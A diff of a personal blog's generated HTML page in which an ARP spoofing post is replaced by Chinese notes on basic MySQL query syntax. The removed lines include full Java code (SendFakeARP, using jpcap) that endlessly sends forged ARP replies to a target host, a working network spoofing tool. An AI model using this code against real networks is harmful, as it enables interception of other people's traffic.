@@ -4,7 +4,7 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="arp">
+    <meta name="keywords" content="mysql基础语法">
     <meta name="description" content="一个人几乎可以在任何他怀有无限热忱的事情上成功。——查尔斯·史考伯">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
@@ -16,7 +16,7 @@
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-    <title>arp欺骗 | 艾茶叶蛋</title>
+    <title>mysql基础语法 | 艾茶叶蛋</title>
     <link rel="icon" type="image/jpeg" href="/favicon.jpg">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.css">
@@ -243,7 +243,7 @@
 <script src="/libs/cryptojs/crypto-js.min.js"></script>
 <script>
     (function() {
-        let pwd = '0f528e7d2fb41dce71c15e7568a23992f8aa30de1473368f9e2dedec43b8c66c';
+        let pwd = '';
         if (pwd && pwd.length > 0) {
             if (pwd !== CryptoJS.SHA256(prompt('请输入访问本文章的密码')).toString(CryptoJS.enc.Hex)) {
                 alert('密码错误！');
@@ -256,12 +256,12 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/4.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/0.jpg')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">arp欺骗</h1>
+                    <h1 class="description center-align post-title">mysql基础语法</h1>
                 </div>
             </div>
         </div>
@@ -378,8 +378,8 @@
                     
                     <div class="article-tag">
                         
-                            <a href="/tags/%E6%8A%80%E8%83%BD/">
-                                <span class="chip bg-color">技能</span>
+                            <a href="/tags/mysql/">
+                                <span class="chip bg-color">mysql</span>
                             </a>
                         
                     </div>
@@ -390,8 +390,8 @@
                     <div class="post-cate">
                         <i class="fas fa-bookmark fa-fw icon-category"></i>
                         
-                            <a href="/categories/%E7%BD%91%E7%BB%9C/" class="post-category">
-                                网络
+                            <a href="/categories/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/" class="post-category">
+                                基础知识
                             </a>
                         
                     </div>
@@ -403,28 +403,28 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
-                    2020-09-14
+                    2021-12-11
                 </div>
                 
 
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
-                    2020-09-25
+                    2021-12-11
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    269
+                    583
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                    1 分
+                    2 分
                 </div>
                 
 
@@ -440,60 +440,83 @@
         <hr class="clearfix">
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <pre><code>
-package com.test.arp;
-import java.net.InetAddress;
-import jpcap.JpcapCaptor;
-import jpcap.JpcapSender;
-import jpcap.NetworkInterface;
-import jpcap.packet.ARPPacket;
-import jpcap.packet.EthernetPacket;
+                <h2 id="一、where子句常用查询条件"><a href="#一、where子句常用查询条件" class="headerlink" title="一、where子句常用查询条件"></a>一、where子句常用查询条件</h2><table>
+<thead>
+<tr>
+<th align="center">谓词</th>
+<th align="center">查询条件</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center">确定范围</td>
+<td align="center">between and, not between and</td>
+</tr>
+<tr>
+<td align="center">确定集合</td>
+<td align="center">in, not in</td>
+</tr>
+<tr>
+<td align="center">字符匹配</td>
+<td align="center">like, not like</td>
+</tr>
+<tr>
+<td align="center">空值</td>
+<td align="center">is null, is not null</td>
+</tr>
+</tbody></table>
+<h2 id="二、like关键字说明"><a href="#二、like关键字说明" class="headerlink" title="二、like关键字说明"></a>二、like关键字说明</h2><pre><code>1.like ‘刘%’  ：查询所有姓刘学生的信息；
 
-public class SendFakeARP {
-    static byte[] stomac(String s) {
-        byte[] mac = new byte[] { (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x00 };
-        String[] s1 = s.split(&quot;-&quot;);
-        for (int x = 0; x &lt; s1.length; x++) {
-            mac[x] = (byte) ((Integer.parseInt(s1[x], 16)) &amp; 0xff);
-        }
-        return mac;
-    }
-    public static void main(String[] args) throws Exception {
-        int time = 2;  // 重发间隔时间
-        InetAddress desip = InetAddress.getByName(&quot;192.168.1.2&quot;);// 被欺骗的目标IP地址
-        byte[] desmac = stomac(&quot;01-1c-23-3c-51-cf&quot;);// 被欺骗的目标目标MAC数组
-        InetAddress srcip = InetAddress.getByName(&quot;192.168.1.3&quot;);// 源IP地址
-        byte[] srcmac = stomac(&quot;00-1C-13-2E-A8-0A&quot;); // 假的MAC数组
-        // 枚举网卡并打开设备
-        NetworkInterface[] devices = JpcapCaptor.getDeviceList();
-        NetworkInterface device = devices[1];
-        JpcapSender sender = JpcapSender.openDevice(device);
-        // 设置ARP包
-        ARPPacket arp = new ARPPacket();
-        arp.hardtype = ARPPacket.HARDTYPE_ETHER;
-        arp.prototype = ARPPacket.PROTOTYPE_IP;
-        arp.operation = ARPPacket.ARP_REPLY;
-        arp.hlen = 6;
-        arp.plen = 4;
-        arp.sender_hardaddr = srcmac;
-        arp.sender_protoaddr = srcip.getAddress();
-        arp.target_hardaddr = desmac;
-        arp.target_protoaddr = desip.getAddress();
-        // 设置DLC帧
-        EthernetPacket ether = new EthernetPacket();
-        ether.frametype = EthernetPacket.ETHERTYPE_ARP;
-        ether.src_mac = srcmac;
-        ether.dst_mac = desmac;
-        arp.datalink = ether;
-        // 发送ARP应答包
-        while (true) {
-            System.out.println(&quot;sending arp..&quot;);
-            sender.sendPacket(arp);
-            Thread.sleep(time * 1000);
-        }
-    }
-}
-</code></pre>
+2.like &#39;欧阳_&#39; : 查询姓为欧阳三个汉字的学生信息；
+
+3.like &#39;_阳%&#39; : 查询第二个字为阳的所有学生信息；
+
+4.like &#39;DB\_abc&#39; escape&#39;\&#39; :查询DB_abc的信息，&#39;\&#39;为换码字符（转义）
+
+5.like &#39;DB\_%i__&#39; escape&#39;\&#39; : 查询以“DB_”开头，且倒数第三个字符为i的信息；</code></pre><h2 id="三、order-by-排序（跟where使用）"><a href="#三、order-by-排序（跟where使用）" class="headerlink" title="三、order by 排序（跟where使用）"></a>三、order by 排序（跟where使用）</h2><pre><code>1.order by ‘xx属性’ asc : 升序；
+
+2.order by ‘xx属性’ desc : 降序；
+
+例：where xx = &quot;xx&quot; order by ‘xx属性’ asc ;</code></pre><h2 id="四、聚集函数"><a href="#四、聚集函数" class="headerlink" title="四、聚集函数"></a>四、聚集函数</h2><table>
+<thead>
+<tr>
+<th align="center">count( [distinct|all] &lt;列名&gt;)</th>
+<th align="center">统计列个数</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center">sum( [distinctall] &lt;列名&gt;)</td>
+<td align="center">计算总额</td>
+</tr>
+<tr>
+<td align="center">avg( [distinctall] &lt;列名&gt;)</td>
+<td align="center">计算平均值</td>
+</tr>
+<tr>
+<td align="center">max( [distinctall] &lt;列名&gt;)</td>
+<td align="center">最大值</td>
+</tr>
+<tr>
+<td align="center">min( [distinctall] &lt;列名&gt;)</td>
+<td align="center">最小值</td>
+</tr>
+</tbody></table>
+<p>distinct：过滤重复项</p>
+<p>all：查询所有值</p>
+<p>聚集函数只能用于select语句和group by 中的having子句，where表达式不允许使用</p>
+<h2 id="五、group-by-子句"><a href="#五、group-by-子句" class="headerlink" title="五、group by 子句"></a>五、group by 子句</h2><pre><code>例：where xx = &quot;xx&quot; group by Sno having count(*)&gt;3;</code></pre><p>根据条件进行分组，并判断分组中Sno是否超过3；</p>
+<h2 id="六、连接查询"><a href="#六、连接查询" class="headerlink" title="六、连接查询"></a>六、连接查询</h2><p>1、等值连接和非等值连接：通过“=”连接起来，对于null的数据项忽略；</p>
+<p>2、自身连接：同一个数据表定义不同别名，并通过条件连接起来；</p>
+<p>3、外连接（对于null的数据项不忽略）：</p>
+<p>​            左连接（left join)：以左边的表为基准连接右边的表;</p>
+<p>​            右连接（right join): 以右边的表为基准连接左边的表；</p>
+<pre><code>例：from A left join B on a.no=b.no 
+    from A left join B using(no)//去除no重复值</code></pre><p>4、多表连接：</p>
+<p>​    where A.no = B.no and C.co = B.co;</p>
+<p>5、嵌套查询：</p>
+<p>​    where no in(select no from xxx) //子查询语句不能使用order by </p>
+<h1 id="七、集合查询"><a href="#七、集合查询" class="headerlink" title="七、集合查询"></a>七、集合查询</h1><p>主要包括并操作union、交操作intersect和差操作except;</p>
+<pre><code>例：查询语句1 union 查询语句2</code></pre><h1 id="八、带exists的谓词子查询"><a href="#八、带exists的谓词子查询" class="headerlink" title="八、带exists的谓词子查询"></a>八、带exists的谓词子查询</h1><p>带exists的谓词子查询不返回任何数据，只产生逻辑“true”或”false“。</p>
+<pre><code>例：Student where exists (select * from SC where no = Student.no and cno =&#39;1&#39;)</code></pre>
             </div>
             <hr/>
 
@@ -518,7 +541,7 @@ public class SendFakeARP {
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="http://scanele.cn/2020/09/14/arp-qi-pian/">http://scanele.cn/2020/09/14/arp-qi-pian/</a>
+                    <a href="http://scanele.cn/2021/12/11/mysql-ji-chu-yu-fa/">http://scanele.cn/2021/12/11/mysql-ji-chu-yu-fa/</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -556,8 +579,8 @@ public class SendFakeARP {
                     
                         <div class="article-tag">
                             
-                                <a href="/tags/%E6%8A%80%E8%83%BD/">
-                                    <span class="chip bg-color">技能</span>
+                                <a href="/tags/mysql/">
+                                    <span class="chip bg-color">mysql</span>
                                 </a>
                             
                         </div>
@@ -986,9 +1009,60 @@ public class SendFakeARP {
 <article id="prenext-posts" class="prev-next articles">
     <div class="row article-row">
         
-        <div class="article col s12 m6" data-aos="fade-up">
+        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
             <div class="article-badge left-badge text-color">
-                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
+                <i class="far fa-dot-circle"></i>&nbsp;本篇
+            </div>
+            <div class="card">
+                <a href="/2021/12/11/mysql-ji-chu-yu-fa/">
+                    <div class="card-image">
+                        
+                        
+                        <img src="/medias/featureimages/0.jpg" class="responsive-img" alt="mysql基础语法">
+                        
+                        <span class="card-title">mysql基础语法</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            mysql基础语法知识
+                        
+                    </div>
+                    <div class="publish-info">
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2021-12-11
+                            </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-bookmark fa-fw icon-category"></i>
+                            
+                            <a href="/categories/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/" class="post-category">
+                                    基础知识
+                                </a>
+                            
+                            
+                        </span>
+                    </div>
+                </div>
+
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/mysql/">
+                        <span class="chip bg-color">mysql</span>
+                    </a>
+                    
+                </div>
+                
+            </div>
+        </div>
+        
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge right-badge text-color">
+                下一篇&nbsp;<i class="fas fa-chevron-right"></i>
+            </div>
             <div class="card">
                 <a href="/2021/11/20/397-zheng-shu-ti-huan/">
                     <div class="card-image">
@@ -1008,9 +1082,9 @@ public class SendFakeARP {
                         
                     </div>
                     <div class="publish-info">
-                        <span class="publish-date">
-                            <i class="far fa-clock fa-fw icon-date"></i>2021-11-20
-                        </span>
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2021-11-20
+                            </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-user fa-fw"></i>
@@ -1018,55 +1092,6 @@ public class SendFakeARP {
                             
                         </span>
                     </div>
-                </div>
-                
-            </div>
-        </div>
-        
-        
-        <div class="article col s12 m6" data-aos="fade-up">
-            <div class="article-badge right-badge text-color">
-                下一篇&nbsp;<i class="fas fa-chevron-right"></i>
-            </div>
-            <div class="card">
-                <a href="/2020/09/05/spring/">
-                    <div class="card-image">
-                        
-                        
-                        <img src="/medias/featureimages/11.jpg" class="responsive-img" alt="spring">
-                        
-                        <span class="card-title">spring</span>
-                    </div>
-                </a>
-                <div class="card-content article-content">
-                    <div class="summary block-with-text">
-                        
-                            spring学习笔记
-                        
-                    </div>
-                    <div class="publish-info">
-                            <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2020-09-05
-                            </span>
-                        <span class="publish-author">
-                            
-                            <i class="fas fa-bookmark fa-fw icon-category"></i>
-                            
-                            <a href="/categories/%E7%AC%94%E8%AE%B0/" class="post-category">
-                                    笔记
-                                </a>
-                            
-                            
-                        </span>
-                    </div>
-                </div>
-                
-                <div class="card-action article-tags">
-                    
-                    <a href="/tags/%E5%90%8E%E7%AB%AF/">
-                        <span class="chip bg-color">后端</span>
-                    </a>
-                    
                 </div>
                 
             </div>
